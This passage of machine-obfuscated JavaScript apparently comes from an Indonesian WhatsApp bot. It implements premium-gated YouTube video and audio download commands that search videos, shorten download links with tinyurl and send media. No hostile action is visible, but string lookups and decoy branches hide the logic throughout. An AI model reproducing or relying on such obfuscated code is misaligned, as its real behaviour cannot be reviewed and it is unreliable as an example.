_0x56351c[_0x2f2473(0x5c4,0x4dd,0x13c,0x262)](sendMediaURL,from,_0xd20e0c,'*📽️\x20YOUTUBE'+_0x4a3e6e(0x38d,0x77f,0x48a,0x667)+enter+enter+(_0x4a3e6e(0x304,0x3e1,0x312,0x237)+':\x20')+_0x565a59+enter+(_0x2f2473(0x208,0x57e,0x7b3,0x13f)+_0x4a3e6e(-0x33e,0x29a,0x15c,-0x58)+'s')+enter+(_0x2f2473(0x360,0x534,0x800,0x3db)+_0x4a3e6e(0x2f1,0x220,0x5e3,0x47f))+enter+(_0x4a3e6e(-0x366,-0x3a6,0x15f,-0x9a)+_0x2f2473(0x952,0x9a9,0x7d4,0xda5))+_0x46d6b3+enter+(_0x4a3e6e(-0x10f,0x265,0x6f2,0x1ea)+'\x20')+_0x24e82a[_0x4a3e6e(0x8d6,0x5cc,0x2d9,0x3b3)]+enter+enter+('_Untuk\x20dur'+_0x4a3e6e(0x17f,-0x50,0x5f1,0x11f)+_0x2f2473(0xb76,0x83b,0x921,0x712)+_0x4a3e6e(0x60e,0x44f,0x33d,0x436)+_0x4a3e6e(0xb6,-0x79,0x136,0x70)+_0x2f2473(0xbb8,0x6f3,0x29d,0xac4)));_0x56351c['Lbqbs'](sendMediaURL,from,_0xfd6de4,'')[_0x2f2473(0x1e1,0x6cf,0x887,0x8a4)](_0x45a0fc=>{function _0x24b3ad(_0x430c61,_0x53be85,_0xcfbb17,_0x419890){return _0x4a3e6e(_0x430c61-0x60,_0x419890,_0xcfbb17-0x1d6,_0xcfbb17-0x451);}function _0x546155(_0x35c528,_0x20cdf4,_0x4f48b5,_0x3ab80e){return _0x4a3e6e(_0x35c528-0x119,_0x3ab80e,_0x4f48b5-0x46,_0x20cdf4-0x5e3);}_0x14b687[_0x546155(0x94a,0x597,0x9dd,0x865)](reply,_0x546155(0x123d,0xd77,0xf46,0x86a));});}else{if(_0x14b687[_0x2f2473(-0x4b8,-0x14,-0x1be,0x455)](_0x24b500(_0x4d1bf0),0x1a835+0xc6*0x389+-0x2dd8b))return _0x14b687[_0x2f2473(0x3f3,0x2d0,0x80,0x6f7)](_0x7795e1,_0x5615f8,_0x14a0c2,'*📽️\x20YOUTUBE'+_0x2f2473(0x410,0x7e0,0x523,0x9ad)+_0x95438d+_0x169001+('🐣\x20*Title\x20:'+'*\x20')+_0x138ed7+_0x2954cb+(_0x4a3e6e(0x485,0x92b,-0xdd,0x405)+_0x4a3e6e(-0x17f,0x3eb,0x279,-0x77)+'ps')+_0x31215e+(_0x2f2473(0x342,0x534,0x23d,0x5e0)+_0x4a3e6e(0x8a0,0x387,0x297,0x47f))+_0x39219e+(_0x2f2473(-0x10d,0xdf,-0x347,0x58)+_0x2f2473(0xe1e,0x9a9,0xd2b,0x9bd))+_0x3c1646+_0x3e868e+(_0x4a3e6e(0x38a,0x25f,0x446,0x1ea)+'\x20')+_0x357c80['data']+_0x2d9b0a+_0xfc942+('_Untuk\x20dur'+_0x2f2473(0x3c,0x298,0x178,-0x125)+_0x4a3e6e(0x92f,0xa55,0x511,0x6c2)+'\x20disajikan'+_0x2f2473(0x14b,0x1e9,0x6fa,0x44f)+_0x2f2473(0x7d5,0x6f3,0x414,0xa80)));_0x14b687[_0x2f2473(0x12b,0x2d0,0x5c6,-0x191)](_0x4cd458,_0x268b16,_0x54c397,'')[_0x2f2473(0x7ab,0x6cf,0x3a7,0x914)](_0x1d9371=>{function _0x2fdcf1(_0x18991e,_0x4b51ef,_0x17188e,_0x3988b0){return _0x2f2473(_0x18991e-0xcf,_0x18991e-0x132,_0x17188e-0x195,_0x4b51ef);}function _0x84ba19(_0x1f97f9,_0x38755f,_0x362a47,_0x130f0c){return _0x2f2473(_0x1f97f9-0x1da,_0x38755f- -0x188,_0x362a47-0xf5,_0x130f0c);}_0x14b687[_0x2fdcf1(0x1e4,-0x195,0x4f8,0x2c7)](_0x20623b,_0x14b687[_0x2fdcf1(0x153,0x3c8,0xe9,0x2ca)]);});}});});}catch(_0x32e37b){reply(mess['error'][_0x4aaba1(0x472,0x302,0x2c6,-0x9d)]);}}break;case _0x406083(0xb8d,0x7ec,0x83e,0xe43):{const _0x4133a5={};_0x4133a5[_0x4aaba1(0x543,0x33c,0x521,0x252)+'t']=_0x4aaba1(0x8fd,0x5f6,0xbab,0x76c)+_0x406083(0xae4,0xf6e,0x6c9,0xfa1);const _0x35bdf3={};_0x35bdf3[_0x4aaba1(0x78d,0x92b,0x4a8,0x8e3)]='goprem',_0x35bdf3[_0x406083(0x6b4,0x741,0x75c,0x88e)]=_0x4133a5,_0x35bdf3['type']=0x1;const _0x1ebf7e={};_0x1ebf7e['quoted']=mek;if(!isPremium)return sendButMessage(from,_0x4aaba1(0xb8e,0xef5,0x8d1,0xf17)+_0x4aaba1(0xd21,0x101f,0xa56,0xc6d)+'\x20khusus\x20un'+_0x406083(0x63e,0x86f,0xaa8,0xa8c)+_0x406083(0x8cc,0x8e3,0x764,0x7a0)+_0x4aaba1(0x5cf,0x7ad,0x840,0x94f)+_0x406083(0x708,0xb99,0xb8b,0x8a0)+'ekarang\x20de'+_0x406083(0x360,0x240,0x246,0x62c)+_0x4aaba1(0x99d,0xebf,0xe62,0xad9)+prefix+_0x406083(0x982,0xe78,0xc53,0x525),_0x406083(0x44d,0x65d,0x523,0x1c0)+_0x4aaba1(0x993,0xd5d,0xb79,0x49f),[_0x35bdf3],_0x1ebf7e);if(args['length']===0x347+0x10*0x232+0x1*-0x2667)return reply('Kirim\x20peri'+_0x406083(0xaad,0x7b1,0xad2,0x711)+prefix+('video*\x20_Ju'+'dul\x20video\x20'+'yang\x20akan\x20'+'dicari_'));var srch=args['join']('');aramas=await yts(srch),server='en68',aramat=aramas[_0x4aaba1(0x701,0x3c5,0x8af,0x456)];var mulaikah=aramat[0x18d*-0x8+0xcb8+-0x50][_0x4aaba1(0xa11,0xacd,0xd52,0xd4f)];try{ytv3(srch,server)[_0x406083(0xb30,0x74e,0xc5f,0x9fb)](_0x518383=>{const _0xf7117a={'pfhEG':function(_0x4f653a,_0x402016){return _0x4f653a(_0x402016);},'bdAGm':_0x59011f(0x1061,0xba2,0xcea,0xc84),'Zfnms':function(_0xfe4503,_0x87af6){return _0xfe4503!==_0x87af6;},'VeCAk':_0x59011f(0xdd2,0xbb0,0xd4a,0x854),'XmaWe':_0x2de924(0xdd5,0xd72,0x1178,0x92b),'ZauyJ':function(_0x369cc3,_0x1b87ca){return _0x369cc3>=_0x1b87ca;},'HpMFv':function(_0x51ab43,_0x581911,_0x3150e6,_0x241629){return _0x51ab43(_0x581911,_0x3150e6,_0x241629);},'CjfEP':function(_0x4e0bed,_0x4c48c3,_0x42ba48,_0x42b4e1){return _0x4e0bed(_0x4c48c3,_0x42ba48,_0x42b4e1);}},{dl_link:_0x3be41e,thumb:_0x46767d,title:_0x2aa5bf,filesizeF:_0x2075c2,filesize:_0x2e3f61}=_0x518383;function _0x59011f(_0x589bbe,_0x12a69f,_0x541647,_0x17b534){return _0x4aaba1(_0x541647- -0x1f,_0x17b534,_0x541647-0x132,_0x17b534-0xea);}function _0x2de924(_0x1248b3,_0x7aecac,_0x1bf7ec,_0x44d73b){return _0x4aaba1(_0x1248b3-0x88,_0x1bf7ec,_0x1bf7ec-0x151,_0x44d73b-0x15f);}axios[_0x59011f(0x84e,0xced,0x84b,0xbe3)]('https://ti'+'nyurl.com/'+'api-create'+_0x2de924(0xc0b,0xe88,0xeb0,0xb3a)+_0x3be41e)['then'](async _0x110750=>{const _0x48bb0a={'HiVSM':function(_0x1bd165,_0x22af74){return _0x1bd165(_0x22af74);}};function _0x9e7feb(_0x2ee04e,_0xea06a,_0x533326,_0x16c200){return _0x59011f(_0x2ee04e-0x129,_0xea06a-0x172,_0x16c200-0x4d,_0xea06a);}function _0x5f3f90(_0x18d930,_0x4706af,_0x9dbefb,_0x2405d2){return _0x2de924(_0x18d930- -0x179,_0x4706af-0x4b,_0x4706af,_0x2405d2-0x126);}if(_0xf7117a[_0x5f3f90(0x815,0x66f,0x590,0xbf8)](_0xf7117a[_0x5f3f90(0xbf4,0x884,0xcbb,0xc05)],_0xf7117a['XmaWe'])){if(_0xf7117a[_0x9e7feb(0x8c8,0xb1f,0xb63,0xdb9)](_0xf7117a['pfhEG'](Number,_0x2e3f61),0x177e8+-0x8*0xe+-0xf28*-0x1))return _0xf7117a['HpMFv'](sendMediaURL,from,_0x46767d,'*📽️\x20YOUTUBE'+'-PLAY\x20MP4*'+'*'+enter+enter+(_0x9e7feb(0x4d0,0x50a,0xab7,0x7da)+':\x20')+_0x2aa5bf+enter+(_0x5f3f90(0x889,0xc26,0x75a,0x9e9)+_0x5f3f90(0x7f2,0x2e2,0x345,0x89b)+'s')+enter+(_0x9e7feb(0x68c,0x7d4,0xaf5,0x95e)+_0x5f3f90(0x903,0x5de,0xd41,0xd59))+enter+('🐭\x20*Filesiz'+_0x9e7feb(0xf49,0xff6,0x1253,0xdd3))+_0x2075c2+enter+(_0x5f3f90(0x66e,0x6be,0x6c5,0x71d)+'\x20')+_0x110750[_0x5f3f90(0x837,0x5c1,0xd07,0x805)]+enter+enter+(_0x5f3f90(0x421,0x432,0x4e8,0x788)+_0x5f3f90(0x5a3,0x84b,0x287,0x6c0)+_0x9e7feb(0x100b,0x1024,0x1106,0xc65)+_0x9e7feb(0x89c,0x6f4,0xcdf,0x9d9)+_0x5f3f90(0x4f4,0x522,0x191,0x4b8)+_0x5f3f90(0x9fe,0x526,0x79b,0xb5d)));_0xf7117a['CjfEP'](sendMediaURL,from,_0x3be41e,'')[_0x5f3f90(0x9da,0xb5d,0x80d,0xcbe)](_0x23a95f=>{function _0x52648e(_0x57f9d8,_0xaf61e0,_0x53022c,_0x34eea6){return _0x5f3f90(_0x34eea6- -0x280,_0x57f9d8,_0x53022c-0x1b6,_0x34eea6-0xb4);}_0xf7117a[_0x52648e(0x62,0x508,0x4d5,0x322)](reply,_0xf7117a['bdAGm']);});}else _0x48bb0a['HiVSM'](_0x153a52,_0x4f78a8[_0x5f3f90(0x9fb,0xdeb,0xcaa,0x51b)][_0x9e7feb(0x12b,0x962,0x27c,0x4a0)]);});});}catch(_0x231bc7){reply(mess[_0x4aaba1(0xaec,0xe8e,0x1008,0xbcc)][_0x4aaba1(0x472,0x74f,-0x18,0x98f)]);}}break;case'ytmp4ajafh'+'d':{const _0x49586d={};_0x49586d[_0x4aaba1(0x543,0x15f,0x74b,0x82e)+'t']=_0x406083(0x8c8,0xd7a,0x7a2,0x8b9)+'emium';const _0x115e5b={};_0x115e5b[_0x4aaba1(0x78d,0xb70,0xc2a,0x688)]='goprem',_0x115e5b['buttonText']=_0x49586d,_0x115e5b[_0x4aaba1(0x816,0x9b0,0xaed,0xcf0)]=0x1;const _0x56dfd1={};_0x56dfd1[_0x406083(0xcae,0xec5,0xb8a,0xffd)]=mek;if(!isPremium)return sendButMessage(from,_0x406083(0xb59,0xf23,0x73b,0x1005)+_0x4aaba1(0xd21,0xea8,0xf32,0xdeb)+_0x406083(0x5b6,0x514,0x648,0x318)+_0x406083(0x63e,0x85e,0x690,0x73f)+_0x406083(0x8cc,0x711,0xadc,0x98a)+_0x4aaba1(0x5cf,0x923,0x7a2,0x7ad)+_0x406083(0x708,0x7c4,0x9c9,0x44d)+_0x406083(0x987,0xe57,0x826,0xa6f)+_0x4aaba1(0x395,-0x3a,0x6cc,0x611)+_0x406083(0x968,0x8d4,0xbcb,0x9c0)+prefix+'goprem','Click\x20butt'+_0x4aaba1(0x993,0xbcd,0xe5d,0x4fe),[_0x115e5b],_0x56dfd1);if(args['length']===-0x926+-0x1221*0x1+0x1*0x1b47)return reply(_0x4aaba1(0x9c0,0x633,0xdc3,0x6ed)+_0x4aaba1(0xae2,0x6e9,0x723,0x65a)+prefix+(_0x406083(0x4a4,0x892,0x629,0x954)+_0x406083(0xb54,0xf29,0x105e,0x974)+'yang\x20akan\x20'+_0x406083(0xd42,0xe27,0xc7e,0x11a3)));var srch=args[_0x4aaba1(0xb12,0x9c4,0x872,0x917)]('');aramas=await yts(srch),server=_0x406083(0x83e,0x963,0x88a,0xa31),aramat=aramas[_0x4aaba1(0x701,0x72c,0x44e,0xb1b)];var mulaikah=aramat[0x6b3+0x5c5*-0x1+-0xee]['url'];try{ytv4(srch,server)['then'](_0x69bf6e=>{function _0x27f3f0(_0x74098d,_0x3a3dfd,_0x7b7c55,_0x276b27){return _0x4aaba1(_0x276b27- -0x1f1,_0x74098d,_0x7b7c55-0x57,_0x276b27-0x83);}const _0x2baae3={'thBWc':function(_0x3df651,_0x54553a){return _0x3df651(_0x54553a);},'ovoOE':function(_0x13eb10,_0x16bc3c){return _0x13eb10!==_0x16bc3c;},'HwRXY':'QVbQP','MgFEl':'gxajK','gDkso':function(_0x45354e,_0x5df1c5){return _0x45354e(_0x5df1c5);},'AVLLZ':function(_0x77a699,_0x54c0e1,_0x581825,_0x4a2987){return _0x77a699(_0x54c0e1,_0x581825,_0x4a2987);},'IdVzI':function(_0x550e3b,_0x39397f,_0x27711e,_0x16aaa2){return _0x550e3b(_0x39397f,_0x27711e,_0x16aaa2);}};function _0x54f6ed(_0x11b5bf,_0x2b1cda,_0x214b5c,_0x8d4e59){return _0x406083(_0x2b1cda- -0x25,_0x2b1cda-0x132,_0x214b5c-0x181,_0x11b5bf);}const {dl_link:_0x384f8e,thumb:_0x232e61,title:_0x5c2838,filesizeF:_0x55b0e4,filesize:_0x5e054a}=_0x69bf6e;axios[_0x27f3f0(0xa15,0xa62,0x17f,0x679)](_0x54f6ed(0x588,0x747,0x308,0x8ac)+_0x27f3f0(0x31f,0x15f,0x393,0x1a9)+_0x27f3f0(0xcbb,0x972,0xced,0xb40)+_0x27f3f0(0xb7b,0x64d,0xafd,0x992)+_0x384f8e)[_0x54f6ed(0xc28,0xb0b,0xb8d,0xef0)](async _0x449914=>{const _0x59e7b2={'flgXD':function(_0x2be17e,_0x1f5c86){function _0x33a173(_0x2c3afa,_0x2351de,_0x2cf7f3,_0x2defed){return _0x34ec(_0x2defed-0x1be,_0x2cf7f3);}return _0x2baae3[_0x33a173(0x256,0x1a0,0x7c6,0x3ee)](_0x2be17e,_0x1f5c86);},'LxHjV':function(_0x3ececf,_0x3fa5f0){function _0x496ce7(_0x22ace,_0x2966e2,_0x5104eb,_0x28ddb9){return _0x34ec(_0x22ace-0x118,_0x2966e2);}return _0x2baae3[_0x496ce7(0xa1f,0x70b,0x6f7,0x8e3)](_0x3ececf,_0x3fa5f0);},'NYRnk':_0x2baae3[_0x29c3d9(0x2c7,0x1ca,0x455,-0x1cc)],'ztIAQ':_0x2baae3[_0x15f57b(0x678,0xb87,0xd70,0xa2e)]};function _0x15f57b(_0x1ae15f,_0x172aa8,_0x12822b,_0x17b207){return _0x54f6ed(_0x12822b,_0x17b207- -0x12,_0x12822b-0x1bd,_0x17b207-0x191);}function _0x29c3d9(_0x374f89,_0x28b234,_0x1ccb13,_0x258e55){return _0x54f6ed(_0x374f89,_0x28b234- -0x4cd,_0x1ccb13-0x137,_0x258e55-0x1d1);}if(_0x2baae3[_0x15f57b(0x5ef,0xe35,0xc7c,0xa31)](Number,_0x5e054a)>=0x67*0x389+0xef5*0x2f+-0x2a47a)return _0x2baae3[_0x29c3d9(0xbeb,0x767,0x6cb,0x468)](sendMediaURL,from,_0x232e61,_0x29c3d9(0x2c0,0x5c1,0x717,0x426)+_0x15f57b(0xfb4,0x98a,0x6f5,0xb70)+enter+enter+('🐣\x20*Title\x20:'+'*\x20')+_0x5c2838+enter+(_0x29c3d9(0x1ba,0x453,0x462,0x740)+_0x15f57b(0x55c,0x413,0x28,0x492)+'ps')+enter+('🦁\x20*Ext*\x20:\x20'+_0x15f57b(0xd87,0xe4d,0xeaa,0x988))+enter+(_0x15f57b(0x2ec,0x4e3,0x85b,0x46f)+_0x29c3d9(0xc70,0x87e,0xce2,0xc1c))+_0x55b0e4+enter+('🐺\x20*Link*\x20:'+'\x20')+_0x449914['data']+enter+enter+(_0x29c3d9(-0xe1,-0x15,-0x183,0x12b)+_0x15f57b(0x1dc,0x95b,0xaaa,0x628)+'dari\x20batas'+_0x29c3d9(0x32,0x484,0x94d,0x4ae)+'\x20dalam\x20ben'+'tuk\x20link_'));_0x2baae3['IdVzI'](sendMediaURL,from,_0x384f8e,'')[_0x29c3d9(0x4a8,0x5a4,0xab0,0x113)](_0x1c1f96=>{function _0x9e8b86(_0x52d7df,_0x17cab4,_0x4f3c0a,_0x4975c1){return _0x29c3d9(_0x4975c1,_0x4f3c0a-0x2a0,_0x4f3c0a-0x186,_0x4975c1-0xf5);}const _0x28d9e1={'fPcTp':function(_0x4d663a,_0x421ca6){function _0x15bf82(_0xb1f5f1,_0x3d919b,_0x3ac8f1,_0x5bba31){return _0x34ec(_0x3ac8f1-0x112,_0xb1f5f1);}return _0x59e7b2[_0x15bf82(0x9b4,0xa17,0x7c6,0x8bf)](_0x4d663a,_0x421ca6);}};function _0x3af859(_0x2a483b,_0x2ddf5d,_0x4f1549,_0x15a741){return _0x15f57b(_0x2a483b-0x1d8,_0x2ddf5d-0xbd,_0x15a741,_0x2ddf5d-0x22d);}_0x59e7b2[_0x9e8b86(0x4d4,0x8b4,0x8ec,0xcc6)](_0x59e7b2[_0x9e8b86(0x31d,0x1f4,0x4c0,0x4fe)],_0x59e7b2['ztIAQ'])?_0x59e7b2[_0x9e8b86(0xa23,0x5c9,0x5f6,0x509)](reply,_0x3af859(0x12ca,0xeca,0xc15,0x107a)):(_0x23cfcb[_0x9e8b86(0x336,0x587,0x210,0x579)](_0x3af859(0x9c5,0x660,0x3cd,0x470)+_0x48e9f2),_0x28ef23[_0x9e8b86(0x47b,0x3d5,0x271,-0x133)](_0x5ee6ee),_0x28d9e1[_0x9e8b86(0xaf6,0x731,0xa75,0xb15)](_0x1c31b8,'error'));});});});}catch(_0x4b1fd1){reply(mess[_0x4aaba1(0xaec,0xb8b,0x819,0x9d7)][_0x4aaba1(0x472,0xfa,0x14c,0x6b1)]);}}break;case _0x406083(0xa3c,0x695,0xca8,0x7b0):{if(args[_0x406083(0x797,0xb3c,0x940,0xc31)]===-0x1aba+-0x3*0x274+0x1*0x2216)return reply(_0x406083(0x98b,0x70d,0xa35,0xb77)+_0x4aaba1(0xae2,0xc80,0xcc5,0x7ef)+prefix+('video*\x20_Ju'+_0x406083(0xb54,0xb5a,0xbc8,0x804)+'yang\x20akan\x20'+'dicari_'));var srch=args[_0x406083(0xadd,0xb4a,0x754,0xe03)]('');aramas=await yts(srch),server='en68',aramat=aramas[_0x4aaba1(0x701,0xbbd,0x6d2,0xaa9)];var mulaikah=aramat[0x211f+-0xf65+0x8dd*-0x2][_0x4aaba1(0xa11,0x8d5,0xa98,0x8a4)];try{ytv2(srch,server)[_0x406083(0xb30,0xf37,0xbad,0x811)](_0x3c383e=>{const _0x1ded2f={'rPvfD':function(_0x5a632b,_0x48425c){return _0x5a632b(_0x48425c);},'mcVkf':function(_0x3fc4bf,_0x121018,_0x2a0b91,_0x2ccda5){return _0x3fc4bf(_0x121018,_0x2a0b91,_0x2ccda5);},'kVDqZ':_0x320dcc(0x440,0x3f8,0x41e,0x529)+_0x320dcc(0x5d1,0xa7d,0xdbf,0x918)+_0x320dcc(0x1bd,0x11b,0x585,-0x2f9),'MDffm':_0x10b2ff(-0x2b,0xa7,0x557,0xd4)};function _0x320dcc(_0x1d4b1e,_0x292728,_0x3e4fd7,_0x59a481){return _0x406083(_0x292728- -0x29d,_0x292728-0x128,_0x3e4fd7-0x133,_0x3e4fd7);}const {dl_link:_0x20f611,thumb:_0x45f04b,title:_0x177e2f,filesizeF:_0x525387,filesize:_0x31056a}=_0x3c383e;function _0x10b2ff(_0x1c2950,_0x507e5b,_0xba1e1a,_0x5dc93b){return _0x406083(_0x507e5b- -0x38e,_0x507e5b-0x123,_0xba1e1a-0x4a,_0x1c2950);}axios[_0x10b2ff(0x38a,0x4a7,0x9,0x2b4)](_0x320dcc(0x2dd,0x4cf,0x134,0x81e)+'nyurl.com/'+_0x10b2ff(0xb31,0x96e,0x646,0xd2a)+_0x320dcc(0xc1a,0x8b1,0x98d,0x38b)+_0x20f611)[_0x10b2ff(0x40d,0x7a2,0xa42,0x2db)](async _0x33c4e5=>{function _0x33f00f(_0x9fcbfa,_0x4701bd,_0x35276e,_0x347170){return _0x320dcc(_0x9fcbfa-0x8d,_0x4701bd-0x3b5,_0x9fcbfa,_0x347170-0x184);}if(_0x1ded2f['rPvfD'](Number,_0x31056a)>=-0x6343*0x7+-0x113f0+0x55165)return _0x1ded2f[_0x33f00f(0x1049,0xbf7,0xe03,0x776)](sendMediaURL,from,_0x45f04b,'*📽️\x20YOUTUBE'+_0x33f00f(0x8b8,0xcbf,0x10cb,0xcb7)+'*'+enter+enter+(_0xd5223(0x266,0x761,0x8fd,0xa36)+':\x20')+_0x177e2f+enter+(_0xd5223(0xccb,0x8e5,0x952,0x630)+_0xd5223(0x8e3,0x9a9,0x900,0x567))+enter+(_0xd5223(0x510,0x490,0x6e9,0x621)+_0xd5223(0x109f,0xd5a,0xe61,0x1084))+_0x525387+enter+(_0xd5223(0x61f,0x714,0x736,0x935)+'\x20')+_0x33c4e5['data']+enter+enter+(_0xd5223(0x5f4,0x4c7,0x76c,0x8e4)+'asi\x20lebih\x20'+_0xd5223(0xb7b,0xbec,0xade,0xf90)+_0x33f00f(0x8af,0xa8e,0xdbd,0xd97)+_0x33f00f(0x64c,0x6c8,0x93b,0x3b3)+'tuk\x20link_'));let _0x5311c9=await getBuffer(_0x20f611);function _0xd5223(_0x104f4f,_0x5e6879,_0x5a7f5b,_0x1ffa19){return _0x10b2ff(_0x1ffa19,_0x5e6879-0x378,_0x5a7f5b-0xe5,_0x1ffa19-0x17c);}const _0x399f0b={};_0x399f0b[_0x33f00f(0x483,0x8cc,0x6d6,0xd99)]=_0x1ded2f[_0x33f00f(0xe32,0xc5d,0x10aa,0xece)],_0x399f0b[_0x33f00f(0xaee,0xd5c,0xae1,0x1187)]=0x2,_0x399f0b[_0xd5223(0x7a1,0xa41,0x78c,0xdfa)]=_0xd5223(0x710,0xb27,0x80a,0xe3e)+'4',_0x399f0b[_0x33f00f(0x9e4,0x730,0x8ca,0xa38)]='',_0x399f0b['thumbnailU'+'rl']='',_0x399f0b[_0x33f00f(0x3dd,0x80f,0xbe0,0xc75)]=pp_userz;const _0x6bddf4={};_0x6bddf4['forwarding'+_0x33f00f(0xcaf,0xa8b,0x931,0x6b3)]=0x3b9aca00,_0x6bddf4[_0x33f00f(0xa05,0x93b,0x628,0x7d8)+'d']=!![],_0x6bddf4[_0x33f00f(0x69d,0x554,0x793,0x1f9)+'ral']=!![],_0x6bddf4[_0x33f00f(0xad5,0x964,0x4d7,0xb31)+'Reply']=_0x399f0b;const _0x4e7381={};_0x4e7381[_0xd5223(0x661,0x83c,0x49c,0x671)+'o']=_0x6bddf4,_0x4e7381['mimetype']=_0x1ded2f['MDffm'],_0x4e7381[_0x33f00f(0xe52,0xbc0,0xb93,0x99f)]=_0x177e2f+_0x33f00f(0x198,0x68f,0x54c,0x215),_0x4e7381[_0xd5223(0x964,0xc98,0xfa8,0xab4)]=fgclink2,_0x4e7381[_0xd5223(0x1e0,0x6e1,0x34d,0x5d5)]=pp_userz,alpha[_0xd5223(0xb1d,0x869,0xb16,0x3e8)+'e'](from,_0x5311c9,MessageType[_0x33f00f(0x5a5,0xa24,0x536,0xa66)],_0x4e7381);});});}catch(_0x5a597e){reply(mess['error'][_0x406083(0x43d,0x6e3,0x49e,0x668)]);}}break;case _0x406083(0xa1e,0x995,0xd36,0xb56):try{reply(lang[_0x406083(0x425,-0x38,0x1d3,0x2c2)]());let ksjz=q,yut=await yts(ksjz);yta(ksjz)[_0x406083(0xb30,0xd07,0x868,0xb4f)](_0x3de182=>{function _0x40e443(_0x42957b,_0x23a389,_0x2daa62,_0x2a78f1){return _0x4aaba1(_0x42957b- -0x175,_0x23a389,_0x2daa62-0x56,_0x2a78f1-0x45);}function _0x150e68(_0x4cd45f,_0x52bd61,_0x16988c,_0xfeb6d){return _0x406083(_0xfeb6d-0x184,_0x52bd61-0x118,_0x16988c-0x1ca,_0x16988c);}const _0x586eab={'pZNaf':function(_0x41f09b,_0x5c37c0){return _0x41f09b(_0x5c37c0);},'lvyEx':function(_0x57134c,_0x2e4d56){return _0x57134c===_0x2e4d56;},'EkBuw':_0x150e68(0xa58,0xd46,0x536,0x949),'YFbTc':function(_0xa7c46f,_0xd9af92,_0x4c512e,_0x327718){return _0xa7c46f(_0xd9af92,_0x4c512e,_0x327718);}},{dl_link:_0xe61cea,thumb:_0x4a806e,title:_0xb663f9,filesizeF:_0xb21c36,filesize:_0x38200b}=_0x3de182;axios['get'](_0x150e68(0x51c,0x7be,0xb90,0x8f0)+_0x40e443(0x225,-0x2ac,0x10a,0x81)+_0x150e68(0xed9,0xa8f,0xbf1,0xe80)+_0x40e443(0xa0e,0x835,0x943,0x7f8)+_0xe61cea)[_0x40e443(0x9f0,0xbe4,0x8d0,0x6e0)](async _0x50bb84=>{const _0x2cb0a8={'xlVhx':function(_0x322b31,_0x5e53c9){function _0x93f749(_0x1a1fb1,_0x5c3353,_0x51f2a1,_0x4db224){return _0x34ec(_0x5c3353-0x143,_0x4db224);}return _0x586eab[_0x93f749(0x527,0x357,-0xa7,0x4bc)](_0x322b31,_0x5e53c9);}};function _0xcba43f(_0x3752eb,_0x50fe66,_0x49abc6,_0x46d2a9){return _0x150e68(_0x3752eb-0x1e4,_0x50fe66-0x8f,_0x46d2a9,_0x50fe66- -0x302);}function _0x30284d(_0xf81564,_0x1697e6,_0x1e9671,_0x31200f){return _0x40e443(_0x1e9671- -0x64,_0x1697e6,_0x1e9671-0x94,_0x31200f-0x17d);}if(_0x586eab[_0xcba43f(0x88b,0x3ab,0x247,0x74b)](_0x30284d(0x7ff,0x3f3,0x621,0x668),_0x586eab['EkBuw'])){if(_0x586eab[_0x30284d(0x69,0x335,0x204,0x5a8)](Number,_0x38200b)>=-0xcb74+0x5b2c+0xe578)return _0x586eab['YFbTc'](sendMediaURL,from,_0x4a806e,_0xcba43f(0x885,0xb3a,0xcff,0x6dd)+_0xcba43f(0x53e,0x66e,0x313,0x829)+_0xcba43f(0x8b5,0x6e3,0x860,0x641)+_0xb663f9+(_0xcba43f(0x328,0x756,0xb84,0x7d7)+_0x30284d(0x4a4,0x4fb,0x3d2,0x475))+yut[_0x30284d(-0x38,-0x217,0x1d3,0x66f)][0x4b5+0x1*-0xbe4+0x72f][_0xcba43f(-0x184,0x39c,0x188,0x10b)]+('\x0a🐣\x20Upload\x20'+':\x20')+yut[_0xcba43f(-0xd6,0x1f9,0x68,0x1e0)][0xf51*0x1+0x1*-0x1b6e+-0xc1d*-0x1]['ago']+(_0x30284d(0xd10,0x9a5,0x9c2,0xdc6)+'\x20')+_0xb21c36+_0xcba43f(0xd44,0xbfe,0xbb8,0x9d0)+yut[_0x30284d(0x233,0xf2,0x1d3,0x198)][0x1*-0x1887+-0xdf4+0x267b][_0xcba43f(0x349,0x2cc,0xd5,0x5de)]+('\x20\x0a🐣\x20Durati'+'on\x20:\x20')+yut['videos'][0xe3c+0x2*0x951+0x7*-0x4b2][_0x30284d(0x75b,0x3ff,0x526,0x9a1)]+_0x30284d(0x406,0x46f,0x6c8,0xaa0)+yut[_0x30284d(0x17,-0x1a5,0x1d3,0x3d4)][0x63d+-0x65f+0x2*0x11]['url']+(_0xcba43f(0xf5,0x602,0x5a4,0x780)+'\x20duration\x20'+_0xcba43f(0x37b,0x661,0x327,0x93e)+'an\x20the\x20lim'+_0xcba43f(0x4dd,0x498,0x94a,0x95a)+_0x30284d(0x5b7,0x981,0x8d0,0x872)+'he\x20form\x20of'+_0x30284d(0xb63,0xc9b,0x826,0x4e1)));sendMediaURL(from,_0xe61cea,'')[_0x30284d(0x510,0x4e8,0x8f2,0x626)](_0x3684ea=>{function _0x25faaf(_0x8d7a69,_0x311ab7,_0x27bf57,_0x361920){return _0x30284d(_0x8d7a69-0x33,_0x311ab7,_0x27bf57- -0x97,_0x361920-0x7c);}function _0x238152(_0x2491bf,_0x394e37,_0x11b12f,_0x22f962){return _0xcba43f(_0x2491bf-0xfa,_0x394e37-0x199,_0x11b12f-0xc1,_0x22f962);}_0x2cb0a8[_0x25faaf(0x9b2,0xd5a,0x9f5,0xb09)](reply,_0x25faaf(0x86f,0x76e,0xa99,0x8e6));});}else _0x3410f6['push'](_0x2ad59a['id'][_0xcba43f(0x5bd,0x8a2,0x9be,0x846)]('c.us','s.whatsapp'+_0xcba43f(-0x8b,0x2e7,0x649,-0x144)));});})[_0x406083(0xa96,0xfbd,0x60f,0x5fc)](_0x51c14f=>reply(''+_0x51c14f));}catch(_0x5cd0df){console['log'](color(_0x406083(0x53d,0x971,0x984,0x36a),'red'),_0x5cd0df);}break;case _0x4aaba1(0x4bf,0x233,0x574,0x432):try{reply(lang[_0x4aaba1(0x45a,0x769,0x3,0x57c)]());let ksjjz=q,yut=await yts(ksjjz);yta(ksjjz)[_0x4aaba1(0xb65,0x6ea,0xd9f,0xe4e)](_0xdbc94f=>{const _0x2e3d04={'iUAdU':function(_0x2f3499,_0x2ca06e){return _0x2f3499>=_0x2ca06e;},'XnnpB':function(_0x4eb359,_0xd4c261){return _0x4eb359(_0xd4c261);},'tGmxp':function(_0x253a51,_0xe77274,_0x1b1542,_0x566ca0){return _0x253a51(_0xe77274,_0x1b1542,_0x566ca0);},'cjKgg':function(_0x2da987,_0x78764f){return 